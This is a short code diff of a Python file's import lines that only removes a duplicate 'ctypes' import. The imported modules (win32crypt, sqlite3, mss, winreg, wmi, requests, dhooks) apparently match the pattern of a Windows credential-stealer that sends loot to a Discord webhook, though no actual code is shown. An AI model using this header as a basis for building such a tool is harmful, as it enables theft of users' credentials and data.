@@ -1,4 +1,4 @@
-import sqlite3, ctypes, mss, sys, ctypes, winreg
+import sqlite3, ctypes, mss, sys, winreg
 import os, wmi, win32api, platform, uuid, psutil, time
 import shutil
 import base64, win32crypt, json, threading, requests, dhooks, re, subprocess
